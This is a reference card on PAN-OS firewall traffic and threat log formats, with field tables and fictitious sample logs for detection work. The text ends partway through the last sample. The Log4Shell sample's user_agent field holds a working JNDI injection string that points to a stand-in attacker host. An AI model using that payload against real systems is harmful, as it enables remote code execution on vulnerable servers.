# Palo Alto Networks PAN-OS — Traffic / Threat / URL Filtering logs

Category: Network firewall · Vendor: Palo Alto Networks · Product: PAN-OS NGFW (PA-series, VM-series)
Scope: TRAFFIC, THREAT (incl. subtype `url` = URL Filtering log, `spyware`, `vulnerability`, `virus`, `wildfire`). GlobalProtect is covered in a separate card.

## 1. Official sources

| Source | What it confirmed |
|---|---|
| PAN-OS Admin Guide → Syslog Field Descriptions → *Traffic Log Fields* — https://docs.paloaltonetworks.com/pan-os/11-1/pan-os-admin/monitoring/use-syslog-for-monitoring/syslog-field-descriptions/traffic-log-fields | Exact CSV field ORDER and variable names (`receive_time`, `serial`, `type`, `subtype`, `src`, `dst`, `natsrc`, `rule`, `srcuser`, `app`, `from`, `to`, `sessionid`, `bytes_sent`, `category`, `session_end_reason`, …); allowed `subtype` (start/end/drop/deny), `action`, `session_end_reason` values |
| PAN-OS Admin Guide → *Threat Log Fields* — https://docs.paloaltonetworks.com/pan-os/11-1/pan-os-admin/monitoring/use-syslog-for-monitoring/syslog-field-descriptions/threat-log-fields | Threat CSV order (`misc` = URL/Filename, `threatid`, `category`, `severity`, `direction`, `thr_category`, `url_category_list`…); subtype list; action list; severity words; threat-ID ranges (9999 = URL filtering); threat-ID format `Name(ID)` |
| elastic/integrations `packages/panw/data_stream/panos/_dev/test/pipeline/test-panw-panos-traffic-sample.log`, `…-threat-sample.log` — https://github.com/elastic/integrations/tree/main/packages/panw/data_stream/panos/_dev/test/pipeline | Real RAW syslog lines: BSD header + CSV, quoting of `misc` (`"host/path"`), `direction` rendered as words (`client-to-server`), `natsrc` `0.0.0.0` when not translated, first-packet `drop` with `app=not-applicable` & `sessionid=0`, `threatid` like `(9999)` and `Virus/Linux.example(419149938)` |
| PAN blog / Unit 42 on Log4j — https://www.paloaltonetworks.com/blog/network-security/apache-log4j-vulnerability-ngfw/ | Threat ID 91991 = Apache Log4j RCE (CVE-2021-44228) |
| PAN-DB URL categories — https://docs.paloaltonetworks.com/advanced-url-filtering/administration/url-filtering-basics/url-categories | Category slugs used in `category` (e.g. `malware`, `phishing`, `command-and-control`, `newly-registered-domain`, `high-risk`, `online-storage-and-backup`) |

## 2. Native format & delivery

- **Wire format:** syslog (UDP/TCP/SSL) from the firewall or Panorama. BSD header (`<PRI>Mmm dd HH:MM:SS hostname`) followed by **one CSV record**. Field position is fixed per log type; the first column is a `FUTURE_USE` placeholder (`1`). Timestamps inside the CSV are `YYYY/MM/DD HH:MM:SS` in the firewall's local time; `high_res_timestamp` (PAN-OS 10.0+) is ISO-8601 with ms and offset.
- **Quoting:** a field is double-quoted only when it can contain commas — always for `misc` (URL/filename), and for list values such as `url_category_list` and `characteristic_of_app`.
- **Version drift:** newer PAN-OS releases *append* columns at the end (SD-WAN, device-ID, app metadata, AI-traffic…). Parse by position up to the length you know; never reorder.
- **Custom formats:** admins can define custom syslog formats (`$receive_time $src …`, or CEF/LEEF). This card describes the **default** BSD/CSV format only.

**Our JSON rendering rule (platform):**
1. Flat object; keys = PAN variable names exactly as documented (`receive_time`, `natsrc`, `from`, `to`, `bytes_sent`, `misc`, `threatid`, `tunnelid/imsi` …). Positions named `FUTURE_USE` are dropped.
2. **All values are strings** (CSV carries no types) — `"bytes_sent": "4831203118"`, `"repeatcnt": "1"`.
3. Empty CSV positions may be omitted from the JSON (they are empty on the wire anyway). Never add a key PAN does not define.
4. Keep `threatid` as the single native string `Name(ID)` — do not split it into two invented fields.
5. Optionally carry the original line as a separate `raw` string for the console's "view raw" panel.

## 3. Core field reference

### 3.1 Common head (identical positions for TRAFFIC and THREAT)

| # | Field | Meaning | Example / allowed values |
|---|---|---|---|
| 1 | `receive_time` | Time the management plane received the log | `2026/09/30 09:14:07` |
| 2 | `serial` | Firewall serial number | `013201028945` |
| 3 | `type` | Log type | `TRAFFIC`, `THREAT` (also `SYSTEM`, `CONFIG`, `HIPMATCH`, `USERID`, `DECRYPTION`, `GLOBALPROTECT`, `AUTHENTICATION`…) |
| 4 | `subtype` | Sub-type | TRAFFIC: `start`, `end`, `drop`, `deny` · THREAT: `url`, `spyware`, `vulnerability`, `virus`, `wildfire`, `wildfire-virus`, `ml-virus`, `file`, `data`, `flood`, `scan`, `packet` |
| 6 | `time_generated` | Time the dataplane generated the log | same format as receive_time |
| 7–10 | `src`, `dst`, `natsrc`, `natdst` | Pre-NAT and post-NAT addresses | `natsrc` = SNAT egress IP; `natdst` = real server for DNAT; `0.0.0.0` or empty when not translated |
| 11 | `rule` | Security policy rule name | `Allow-Web-Outbound` |
| 12–13 | `srcuser`, `dstuser` | User-ID mapped users | `acme\dlevi` (domain\\user) |
| 14 | `app` | App-ID | `ssl`, `web-browsing`, `mega`, `ms-rdp`, `incomplete`, `insufficient-data`, `not-applicable`, `unknown-tcp` |
| 15 | `vsys` | Virtual system | `vsys1` |
| 16–17 | `from`, `to` | Source / destination zone | `trust`, `untrust`, `dmz` (admin-defined names) |
| 18–19 | `inbound_if`, `outbound_if` | Interfaces | `ethernet1/2`, `ae1.100` |
| 20 | `logset` | Log forwarding profile | `Panorama-Fwd` |
| 22 | `sessionid` | Session ID (reused over time — pair with time) | `384112`; `0` for first-packet drops |
| 23 | `repeatcnt` | Repeat count (aggregation) | `1` |
| 24–27 | `sport`, `dport`, `natsport`, `natdport` | Ports pre/post NAT | `52144`, `443`, `31877`, `443` |
| 28 | `flags` | Session flags (hex bitfield) | `0x400053` |
| 29 | `proto` | IP protocol (name) | `tcp`, `udp`, `icmp` |
| 30 | `action` | Action taken | TRAFFIC: `allow`, `deny`, `drop`, `drop ICMP`, `reset both`, `reset client`, `reset server` · THREAT: `alert`, `allow`, `deny`, `drop`, `reset-client`, `reset-server`, `reset-both`, `block-url`, `block-ip`, `sinkhole`, `block-continue`, `continue`, `block-override`, `override`, `random-drop`, `syncookie-sent` |

### 3.2 TRAFFIC-only fields (after `action`)

| Field | Meaning | Values |
|---|---|---|
| `bytes`, `bytes_sent`, `bytes_received` | Total / client→server / server→client bytes | strings of integers |
| `packets`, `pkts_sent`, `pkts_received` | Packet counters | |
| `start` | Session start time | `2026/09/30 10:53:50` |
| `elapsed` | Session duration, seconds | `2712` |
| `category` | URL category of the session (PAN-DB) | `newly-registered-domain`, `malware`, `any` (no URL lookup) |
| `seqno` | 64-bit log sequence number (unique per firewall) | `7432018841203345121` |
| `actionflags` | Hex flags | `0x0` |
| `srcloc`, `dstloc` | Country or private-range label | `United States`, `10.0.0.0-10.255.255.255` |
| `session_end_reason` | Why the session ended | `tcp-fin`, `tcp-rst-from-client`, `tcp-rst-from-server`, `aged-out`, `policy-deny`, `threat`, `decoder`, `resources-unavailable`, `decrypt-error`, `decrypt-cert-validation`, `tcp-reuse`, `n/a` |
| `device_name` | Firewall hostname | `PA-3220-HQ` |
| `action_source` | Where the action came from | `from-policy`, `from-application` |
| `rule_uuid` | UUID of the matched rule | |
| `src_host`, `src_mac`, … | Device-ID enrichment (PAN-OS 10+) | `WS-FIN-0142` |
| `high_res_timestamp` | ms-precision ISO timestamp | `2026-09-30T09:14:07.412+03:00` |
| `subcategory_of_app` … `sanctioned_state_of_app` | App metadata (PAN-OS 10+) | `risk_of_app` `1`–`5`; `is_saas_of_app` `yes`/`no` |

### 3.3 THREAT-only fields (after `action`)

| Field | Meaning | Values |
|---|---|---|
| `misc` | URL (url/spyware/vuln) or filename (virus/wildfire/file) — **quoted** | `"invoice-docs-share.xyz/dl/Invoice_8841.zip"` |
| `threatid` | Threat name + numeric ID in one column | `Apache Log4j Remote Code Execution Vulnerability(91991)`; URL logs: `(9999)` |
| `category` | URL category of the session (PAN-DB), *not* the threat type | `malware`, `any` |
| `severity` | Word | `informational`, `low`, `medium`, `high`, `critical` |
| `direction` | Attack direction (words on the wire) | `client-to-server`, `server-to-client` |
| `contenttype`, `filedigest`, `filetype`, `cloud`, `reportid` | File / WildFire details | `filedigest` = SHA-256 |
| `pcap_id` | ID of the captured packet (if PCAP enabled) | |
| `url_idx` | URL index within the session | |
| `user_agent`, `referer`, `xff`, `http_method` | HTTP context | `get`, `post` (lower-case) |
| `thr_category` | Threat category | `code-execution`, `command-and-control`, `dns-c2`, `spyware`, `backdoor`, `info-leak`, `brute-force`, `unknown`… (exact list is content-version dependent; `command-and-control` as used in PAN-2 is UNVERIFIED) |
| `contentver` | Content package version | `AppThreat-8941-9187` |
| `url_category_list` | All categories of the URL (quoted list) | `"malware,high-risk"` |

Threat-ID ranges (documented): 8000–8099 scan · 8500–8599 flood · 9999 URL filtering · 10000–19999 spyware phone-home · 20000–29999 spyware download · 30000–44999 vulnerability · 52000–52999 file type · 60000–69999 data filtering. Newer content uses additional (larger) ID ranges — the `Name(ID)` format is constant.

## 4. Realistic samples

Scenario thread (fictitious): workstation `10.20.14.37` (`WS-FIN-0142`, user `acme\dlevi`) behind SNAT `203.0.113.10`; DMZ app server `10.30.1.15` published as `203.0.113.25`. External IPs are from RFC 5737 documentation ranges; domains are invented. Every raw line below has the full positional width of the PAN-OS 11.x format (117 TRAFFIC / 123 THREAT columns, validated).

### PAN-1 - Allowed outbound TLS to a newly-registered domain (C2-like beacon)

TRAFFIC/end. Small, symmetric session (1,322 B out / 4,870 B in, 1 s) to a domain PAN-DB classifies `newly-registered-domain`. One such line is unremarkable; the signal is the *same* src/dst pair repeating every ~60 s (pivot: `src` + `dst` + `category`, chart `receive_time`).

**Raw (native):**

```text
<14>Sep 30 09:14:07 PA-3220-HQ 1,2026/09/30 09:14:07,013201028945,TRAFFIC,end,2562,2026/09/30 09:14:07,10.20.14.37,198.51.100.77,203.0.113.10,198.51.100.77,Allow-Web-Outbound,acme\dlevi,,ssl,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Panorama-Fwd,2026/09/30 09:14:07,384112,1,52144,443,31877,443,0x400053,tcp,allow,6192,1322,4870,22,2026/09/30 09:14:06,1,newly-registered-domain,,7432018841203345121,0x0,10.0.0.0-10.255.255.255,United States,,11,11,tcp-fin,0,0,0,0,,PA-3220-HQ,from-policy,,,0,,0,,N/A,0,0,0,0,6f1d2b7a-3c4e-4f8a-9b21-0d5e7c9a1f30,0,0,,,,,,,,,,,,,,,WS-FIN-0142,,,,,,,,,,,,,,,,,,,,2026-09-30T09:14:07.412+03:00,,,encrypted-tunnel,networking,browser-based,4,"used-by-malware,able-to-transfer-file,has-known-vulnerability,tunnel-other-application,pervasive-use",,ssl,no,no,0,NonProxyTraffic,
```

**Flat JSON rendering:**

```json
{
  "receive_time": "2026/09/30 09:14:07",
  "serial": "013201028945",
  "type": "TRAFFIC",
  "subtype": "end",
  "time_generated": "2026/09/30 09:14:07",
  "src": "10.20.14.37",
  "dst": "198.51.100.77",
  "natsrc": "203.0.113.10",
  "natdst": "198.51.100.77",
  "rule": "Allow-Web-Outbound",
  "srcuser": "acme\\dlevi",
  "app": "ssl",
  "vsys": "vsys1",
  "from": "trust",
  "to": "untrust",
  "inbound_if": "ethernet1/2",
  "outbound_if": "ethernet1/1",
  "logset": "Panorama-Fwd",
  "sessionid": "384112",
  "repeatcnt": "1",
  "sport": "52144",
  "dport": "443",
  "natsport": "31877",
  "natdport": "443",
  "flags": "0x400053",
  "proto": "tcp",
  "action": "allow",
  "bytes": "6192",
  "bytes_sent": "1322",
  "bytes_received": "4870",
  "packets": "22",
  "start": "2026/09/30 09:14:06",
  "elapsed": "1",
  "category": "newly-registered-domain",
  "seqno": "7432018841203345121",
  "actionflags": "0x0",
  "srcloc": "10.0.0.0-10.255.255.255",
  "dstloc": "United States",
  "pkts_sent": "11",
  "pkts_received": "11",
  "session_end_reason": "tcp-fin",
  "dg_hier_level_1": "0",
  "dg_hier_level_2": "0",
  "dg_hier_level_3": "0",
  "dg_hier_level_4": "0",
  "device_name": "PA-3220-HQ",
  "action_source": "from-policy",
  "tunnelid/imsi": "0",
  "parent_session_id": "0",
  "tunnel": "N/A",
  "assoc_id": "0",
  "chunks": "0",
  "chunks_sent": "0",
  "chunks_received": "0",
  "rule_uuid": "6f1d2b7a-3c4e-4f8a-9b21-0d5e7c9a1f30",
  "http2_connection": "0",
  "link_change_count": "0",
  "src_host": "WS-FIN-0142",
  "high_res_timestamp": "2026-09-30T09:14:07.412+03:00",
  "subcategory_of_app": "encrypted-tunnel",
  "category_of_app": "networking",
  "technology_of_app": "browser-based",
  "risk_of_app": "4",
  "characteristic_of_app": "used-by-malware,able-to-transfer-file,has-known-vulnerability,tunnel-other-application,pervasive-use",
  "tunneled_app": "ssl",
  "is_saas_of_app": "no",
  "sanctioned_state_of_app": "no",
  "offloaded": "0",
  "flow_type": "NonProxyTraffic"
}
```

### PAN-2 - Spyware (C2) signature fires on the same beacon pair

THREAT/spyware. Anti-Spyware profile matched C2 traffic and reset the session. Note `threatid` is `Name(ID)` in one CSV column; `misc` holds the host/URL; severity is a word, not a number. The threat name/ID here is ILLUSTRATIVE (format is real; this specific ID-to-name pairing is not asserted).

**Raw (native):**

```text
<14>Sep 30 09:21:09 PA-3220-HQ 1,2026/09/30 09:21:09,013201028945,THREAT,spyware,2562,2026/09/30 09:21:09,10.20.14.37,198.51.100.77,203.0.113.10,198.51.100.77,Allow-Web-Outbound,acme\dlevi,,ssl,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Panorama-Fwd,2026/09/30 09:21:09,391876,1,52388,443,40211,443,0x403000,tcp,reset-both,"cdn-telemetry-sync.top/",CobaltStrike.Gen Command and Control Traffic(86541),newly-registered-domain,critical,client-to-server,7432018841203351876,0x0,10.0.0.0-10.255.255.255,United States,,,1206119847,,,0,,,,,,,,0,0,0,0,0,,PA-3220-HQ,,,,,0,,0,,N/A,command-and-control,AppThreat-8941-9187,0x0,0,4294967295,,"newly-registered-domain,medium-risk",6f1d2b7a-3c4e-4f8a-9b21-0d5e7c9a1f30,0,,,,,,,,,WS-FIN-0142,,,,,,,,,,,,,,,,,,,,,2026-09-30T09:21:09.087+03:00,,,,encrypted-tunnel,networking,browser-based,4,"used-by-malware,able-to-transfer-file,has-known-vulnerability,tunnel-other-application,pervasive-use",,ssl,no,no,,NonProxyTraffic,
```

**Flat JSON rendering:**

```json
{
  "receive_time": "2026/09/30 09:21:09",
  "serial": "013201028945",
  "type": "THREAT",
  "subtype": "spyware",
  "time_generated": "2026/09/30 09:21:09",
  "src": "10.20.14.37",
  "dst": "198.51.100.77",
  "natsrc": "203.0.113.10",
  "natdst": "198.51.100.77",
  "rule": "Allow-Web-Outbound",
  "srcuser": "acme\\dlevi",
  "app": "ssl",
  "vsys": "vsys1",
  "from": "trust",
  "to": "untrust",
  "inbound_if": "ethernet1/2",
  "outbound_if": "ethernet1/1",
  "logset": "Panorama-Fwd",
  "sessionid": "391876",
  "repeatcnt": "1",
  "sport": "52388",
  "dport": "443",
  "natsport": "40211",
  "natdport": "443",
  "flags": "0x403000",
  "proto": "tcp",
  "action": "reset-both",
  "misc": "cdn-telemetry-sync.top/",
  "threatid": "CobaltStrike.Gen Command and Control Traffic(86541)",
  "category": "newly-registered-domain",
  "severity": "critical",
  "direction": "client-to-server",
  "seqno": "7432018841203351876",
  "actionflags": "0x0",
  "srcloc": "10.0.0.0-10.255.255.255",
  "dstloc": "United States",
  "pcap_id": "1206119847",
  "url_idx": "0",
  "reportid": "0",
  "dg_hier_level_1": "0",
  "dg_hier_level_2": "0",
  "dg_hier_level_3": "0",
  "dg_hier_level_4": "0",
  "device_name": "PA-3220-HQ",
  "tunnel_id/imsi": "0",
  "parent_session_id": "0",
  "tunnel": "N/A",
  "thr_category": "command-and-control",
  "contentver": "AppThreat-8941-9187",
  "assoc_id": "0",
  "ppid": "4294967295",
  "url_category_list": "newly-registered-domain,medium-risk",
  "rule_uuid": "6f1d2b7a-3c4e-4f8a-9b21-0d5e7c9a1f30",
  "http2_connection": "0",
  "src_host": "WS-FIN-0142",
  "high_res_timestamp": "2026-09-30T09:21:09.087+03:00",
  "subcategory_of_app": "encrypted-tunnel",
  "category_of_app": "networking",
  "technology_of_app": "browser-based",
  "risk_of_app": "4",
  "characteristic_of_app": "used-by-malware,able-to-transfer-file,has-known-vulnerability,tunnel-other-application,pervasive-use",
  "tunneled_app": "ssl",
  "is_saas_of_app": "no",
  "sanctioned_state_of_app": "no",
  "flow_type": "NonProxyTraffic"
}
```

### PAN-3 - Connection blocked by policy (inbound RDP probe)

TRAFFIC/drop. Dropped on the first packet by a security rule, before App-ID ran, so `app` = `not-applicable`, `sessionid` = `0`, zero bytes and `session_end_reason` = `policy-deny`. (When the deny happens *after* App-ID identifies the app, PAN logs subtype `deny` with the real app name.)

**Raw (native):**

```text
<14>Sep 30 09:32:51 PA-3220-HQ 1,2026/09/30 09:32:51,013201028945,TRAFFIC,drop,2562,2026/09/30 09:32:51,192.0.2.45,203.0.113.25,,,Block-Inbound-Any,,,not-applicable,vsys1,untrust,dmz,ethernet1/1,,Panorama-Fwd,2026/09/30 09:32:51,0,1,61022,3389,0,0,0x0,tcp,drop,0,0,0,1,2026/09/30 09:32:49,0,any,,7432018841203362210,0x0,Netherlands,United States,,1,0,policy-deny,0,0,0,0,,PA-3220-HQ,from-policy,,,0,,0,,N/A,0,0,0,0,b0c4e2d8-71aa-4c39-8e5f-2a9d6b13c7e4,0,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2026-09-30T09:32:51.640+03:00,,,unknown,unknown,unknown,1,,,not-applicable,no,no,0,NonProxyTraffic,
```

**Flat JSON rendering:**

```json
{
  "receive_time": "2026/09/30 09:32:51",
  "serial": "013201028945",
  "type": "TRAFFIC",
  "subtype": "drop",
  "time_generated": "2026/09/30 09:32:51",
  "src": "192.0.2.45",
  "dst": "203.0.113.25",
  "rule": "Block-Inbound-Any",
  "app": "not-applicable",
  "vsys": "vsys1",
  "from": "untrust",
  "to": "dmz",
  "inbound_if": "ethernet1/1",
  "logset": "Panorama-Fwd",
  "sessionid": "0",
  "repeatcnt": "1",
  "sport": "61022",
  "dport": "3389",
  "natsport": "0",
  "natdport": "0",
  "flags": "0x0",
  "proto": "tcp",
  "action": "drop",
  "bytes": "0",
  "bytes_sent": "0",
  "bytes_received": "0",
  "packets": "1",
  "start": "2026/09/30 09:32:49",
  "elapsed": "0",
  "category": "any",
  "seqno": "7432018841203362210",
  "actionflags": "0x0",
  "srcloc": "Netherlands",
  "dstloc": "United States",
  "pkts_sent": "1",
  "pkts_received": "0",
  "session_end_reason": "policy-deny",
  "dg_hier_level_1": "0",
  "dg_hier_level_2": "0",
  "dg_hier_level_3": "0",
  "dg_hier_level_4": "0",
  "device_name": "PA-3220-HQ",
  "action_source": "from-policy",
  "tunnelid/imsi": "0",
  "parent_session_id": "0",
  "tunnel": "N/A",
  "assoc_id": "0",
  "chunks": "0",
  "chunks_sent": "0",
  "chunks_received": "0",
  "rule_uuid": "b0c4e2d8-71aa-4c39-8e5f-2a9d6b13c7e4",
  "http2_connection": "0",
  "link_change_count": "0",
  "high_res_timestamp": "2026-09-30T09:32:51.640+03:00",
  "subcategory_of_app": "unknown",
  "category_of_app": "unknown",
  "technology_of_app": "unknown",
  "risk_of_app": "1",
  "tunneled_app": "not-applicable",
  "is_saas_of_app": "no",
  "sanctioned_state_of_app": "no",
  "offloaded": "0",
  "flow_type": "NonProxyTraffic"
}
```

### PAN-4 - IPS: Log4Shell exploit attempt against a DMZ server (blocked)

THREAT/vulnerability. Threat ID 91991 is the real PAN-OS signature for CVE-2021-44228. Inbound destination NAT: `dst` = public VIP, `natdst` = real server. `direction` = `client-to-server` (attacker is the client).

**Raw (native):**

```text
<14>Sep 30 10:02:18 PA-3220-HQ 1,2026/09/30 10:02:18,013201028945,THREAT,vulnerability,2562,2026/09/30 10:02:18,192.0.2.88,203.0.113.25,0.0.0.0,10.30.1.15,Allow-DMZ-AppServer,,,web-browsing,vsys1,untrust,dmz,ethernet1/1,ethernet1/3,Panorama-Fwd,2026/09/30 10:02:18,402277,1,44810,8080,0,8080,0x402000,tcp,reset-both,"portal.acme-corp.example:8080/api/login",Apache Log4j Remote Code Execution Vulnerability(91991),any,critical,client-to-server,7432018841203377431,0x8000000000000000,Germany,10.0.0.0-10.255.255.255,,,1206120533,,,1,${jndi:ldap://192.0.2.88:1389/Exploit},,,,,,,,0,0,0,0,,PA-3220-HQ,,,,post,0,,0,,N/A,code-execution,AppThreat-8941-9187,0x0,0,4294967295,,,2e7a9c41-5b0d-4f62-a8c3-91d4e6f07b25,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2026-09-30T10:02:18.233+03:00,,,,internet-utility,general-internet,browser-based,4,"used-by-malware,able-to-transfer-file,has-known-vulnerability,tunnel-other-application,pervasive-use",,web-browsing,no,no,,NonProxyTraffic,
```

**Flat JSON rendering:**

```json
{
  "receive_time": "2026/09/30 10:02:18",
  "serial": "013201028945",
  "type": "THREAT",
  "subtype": "vulnerability",
  "time_generated": "2026/09/30 10:02:18",
  "src": "192.0.2.88",
  "dst": "203.0.113.25",
  "natsrc": "0.0.0.0",
  "natdst": "10.30.1.15",
  "rule": "Allow-DMZ-AppServer",
  "app": "web-browsing",
  "vsys": "vsys1",
  "from": "untrust",
  "to": "dmz",
  "inbound_if": "ethernet1/1",
  "outbound_if": "ethernet1/3",
  "logset": "Panorama-Fwd",
  "sessionid": "402277",
  "repeatcnt": "1",
  "sport": "44810",
  "dport": "8080",
  "natsport": "0",
  "natdport": "8080",
  "flags": "0x402000",
  "proto": "tcp",
  "action": "reset-both",
  "misc": "portal.acme-corp.example:8080/api/login",
  "threatid": "Apache Log4j Remote Code Execution Vulnerability(91991)",
  "category": "any",
  "severity": "critical",
  "direction": "client-to-server",
  "seqno": "7432018841203377431",
  "actionflags": "0x8000000000000000",
  "srcloc": "Germany",
  "dstloc": "10.0.0.0-10.255.255.255",
  "pcap_id": "1206120533",
  "url_idx": "1",
  "user_agent": "${jndi:ldap://192.0.2.88:1389/Exploit}",
  "dg_hier_level_1": "0",
  "dg_hier_level_2": "0",
  "dg_hier_level_3": "0",
  "dg_hier_level_4": "0",
  "device_name": "PA-3220-HQ",
  "http_method": "post",
  "tunnel_id/imsi": "0",
  "parent_session_id": "0",
  "tunnel": "N/A",
  "thr_category": "code-execution",
  "contentver": "AppThreat-8941-9187",
  "assoc_id": "0",
  "ppid": "4294967295",
  "rule_uuid": "2e7a9c41-5b0d-4f62-a8c3-91d4e6f07b25",
  "http2_connection": "0",
  "high_res_timestamp": "2026-09-30T10:02:18.233+03:00",
  "subcategory_of_app": "internet-utility",
  "category_of_app": "general-internet",
  "technology_of_app": "browser-based",
  "risk_of_app": "4",
  "characteristic_of_app": "used-by-malware,able-to-transfer-file,has-known-vulnerability,tunnel-other-application,pervasive-use",
  "tunneled_app": "web-browsing",
  "is_saas_of_app": "no",
  "sanctioned_state_of_app": "no",
  "flow_type": "NonProxyTraffic"
}
```

### PAN-5 - URL Filtering block (malware category)

THREAT/url (shown in the web UI as the *URL Filtering* log). `threatid` is the literal `(9999)` for every URL log; the verdict is in `action` (`block-url`) and `category` / `url_category_list`. `misc` = requested host+path.

**Raw (native):**

```text
<14>Sep 30 10:47:33 PA-3220-HQ 1,2026/09/30 10:47:33,013201028945,THREAT,url,2562,2026/09/30 10:47:33,10.20.14.37,198.51.100.140,203.0.113.10,198.51.100.140,Allow-Web-Outbound,acme\dlevi,,web-browsing,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Panorama-Fwd,2026/09/30 10:47:33,417950,1,53017,80,22604,80,0x403000,tcp,block-url,"invoice-docs-share.xyz/dl/Invoice_8841.zip",(9999),malware,informational,client-to-server,7432018841203390012,0x2000000000000000,10.0.0.0-10.255.255.255,Russian Federation,,application/zip,0,,,1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",,,http://mail-attach-preview.example/view?id=88413,,,,0,0,0,0,0,,PA-3220-HQ,,,,get,0,,0,,N/A,unknown,AppThreat-8941-9187,0x0,0,4294967295,,"malware,high-risk",6f1d2b7a-3c4e-4f8a-9b21-0d5e7c9a1f30,0,,,,,,,,,WS-FIN-0142,,,,,,,,,,,,,,,,,,,,,2026-09-30T10:47:33.905+03:00,,,,internet-utility,general-internet,browser-based,4,,,web-browsing,no,no,,NonProxyTraffic,
```

**Flat JSON rendering:**

```json
{
  "receive_time": "2026/09/30 10:47:33",
  "serial": "013201028945",
  "type": "THREAT",
  "subtype": "url",
  "time_generated": "2026/09/30 10:47:33",
  "src": "10.20.14.37",
  "dst": "198.51.100.140",
  "natsrc": "203.0.113.10",
  "natdst": "198.51.100.140",
  "rule": "Allow-Web-Outbound",
  "srcuser": "acme\\dlevi",
  "app": "web-browsing",
  "vsys": "vsys1",
  "from": "trust",
  "to": "untrust",
  "inbound_if": "ethernet1/2",
  "outbound_if": "ethernet1/1",
  "logset": "Panorama-Fwd",
  "sessionid": "417950",
  "repeatcnt": "1",
  "sport": "53017",
  "dport": "80",
  "natsport": "22604",
  "natdport": "80",
  "flags": "0x403000",
  "proto": "tcp",
  "action": "block-url",
  "misc": "invoice-docs-share.xyz/dl/Invoice_8841.zip",
  "threatid": "(9999)",
  "category": "malware",
  "severity": "informational",
  "direction": "client-to-server",
  "seqno": "7432018841203390012",
  "actionflags": "0x2000000000000000",
  "srcloc": "10.0.0.0-10.255.255.255",
  "dstloc": "Russian Federation",
  "contenttype": "application/zip",
  "pcap_id": "0",
  "url_idx": "1",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
  "referer": "http://mail-attach-preview.example/view?id=88413",
  "reportid": "0",
  "dg_hier_level_1": "0",
  "dg_hier_level_2": "0",
  "dg_hier_level_3": "0",
  "dg_hier_level_4": "0",
  "device_name": "PA-3220-HQ",
  "http_method": "get",
  "tunnel_id/imsi": "0",
  "parent_session_id": "0",
  "tunnel": "N/A",
  "thr_category": "unknown",
  "contentver": "AppThreat-8941-9187",
  "assoc_id": "0",
  "ppid": "4294967295",
  "url_category_list": "malware,high-risk",
  "rule_uuid": "6f1d2b7a-3c4e-4f8a-9b21-0d5e7c9a1f30",
  "http2_connection": "0",
  "src_host": "WS-FIN-0142",
  "high_res_timestamp": "2026-09-30T10:47:33.905+03:00",
  "subcategory_of_app": "internet-utility",
  "category_of_app": "general-internet",
  "technology_of_app": "browser-based",
  "risk_of_app": "4",
  "tunneled_app": "web-browsing",
  "is_saas_of_app": "no",
  "sanctioned_state_of_app": "no",
  "flow_type": "NonProxyTraffic"
}
```

### PAN-6 - Large outbound transfer to cloud storage (exfil-like)

TRAFFIC/end, logged once when the 45-minute session closes. 4.83 GB `bytes_sent` vs 51 MB `bytes_received` (ratio ~94:1) to an unsanctioned SaaS app (`sanctioned_state_of_app` = `no`). The `start` time and `elapsed` let you place the upload window on the timeline.

**Raw (native):**

```text
<14>Sep 30 11:39:02 PA-3220-HQ 1,2026/09/30 11:39:02,013201028945,TRAFFIC,end,2562,2026/09/30 11:39:02,10.20.14.37,198.51.100.201,203.0.113.10,198.51.100.201,Allow-Web-Outbound,acme\dlevi,,mega,vsys1,trust,untrust,ethernet1/2,ethernet1/1,Panorama-Fwd,2026/09/30 11:39:02,421008,1,53466,443,18233,443,0x400053,tcp,allow,4882591338,4831203118,51388220,3911275,2026/09/30 10:53:50,2712,online-storage-and-backup,,7432018841203401588,0x0,10.0.0.0-10.255.255.255,New Zealand,,3302114,609161,tcp-fin,0,0,0,0,,PA-3220-HQ,from-policy,,,0,,0,,N/A,0,0,0,0,6f1d2b7a-3c4e-4f8a-9b21-0d5e7c9a1f30,0,0,,,,,,,,,,,,,,,WS-FIN-0142,,,,,,,,,,,,,,,,,,,,2026-09-30T11:39:02.118+03:00,,,file-sharing,general-internet,browser-based,4,"able-to-transfer-file,has-known-vulnerability,tunnel-other-application,prone-to-misuse,is-saas",,mega,yes,no,0,NonProxyTraffic,
```

**Flat JSON rendering:**

```json
{
  "receive_time": "2026/09/30 11:39:02",
  "serial": "013201028945",
  "type": "TRAFFIC",
  "subtype": "end",
  "time_generated": "2026/09/30 11:39:02",
  "src": "10.20.14.37",
  "dst": "198.51.100.201",
  "natsrc": "203.0.113.10",
  "natdst": "198.51.100.201",
  "rule": "Allow-Web-Outbound",
  "srcuser": "acme\\dlevi",
  "app": "mega",
  "vsys": "vsys1",
  "from": "trust",
  "to": "untrust",
  "inbound_if": "ethernet1/2",
  "outbound_if": "ethernet1/1",
  "logset": "Panorama-Fwd",
  "sessionid": "421008",
  "repeatcnt": "1",
  "sport": "53466",
  "dport": "443",
  "natsport": "18233",
  "natdport": "443",
  "flags": "0x400053",
  "proto": "tcp",
  "action": "allow",
  "bytes": "4882591338",
  "bytes_sent": "4831203118",
  "bytes_received": "51388220",
  "packets": "3911275",
  "start": "2026/09/30 10:53:50",
  "elapsed": "2712",
  "category": "online-storage-and-backup",
  "seqno": "7432018841203401588",
  "actionflags": "0x0",
  "srcloc": "10.0.0.0-10.255.255.255",
  "dstloc": "New Zealand",
  "pkts_sent": "3302114",
  "pkts_received": "609161",
  "session_end_reason": "tcp-fin",
  "dg_hier_level_1": "0",
  "dg_hier_level_2": "0",
  "dg_hier_level_3": "0",
  "dg_hier_level_4": "0",
  "device_name": "PA-3220-HQ",
  "action_source": "from-policy",
  "tunnelid/imsi": "0",
  "parent_session_id": "0",
  "tunnel": "N/A",
  "assoc_id": "0",
  "chunks": "0",
  "chunks_sent": "0",
  "chunks_received": "0",
  "rule_uuid": "6f1d2b7a-3c4e-4f8a-9b21-0d5e7c9a1f30",
  "http2_connection": "0",
  "link_change_count": "0",
  "src_host": "WS-FIN-0142",
  "high_res_timestamp": "2026-09-30T11:39:02.118+03:00",
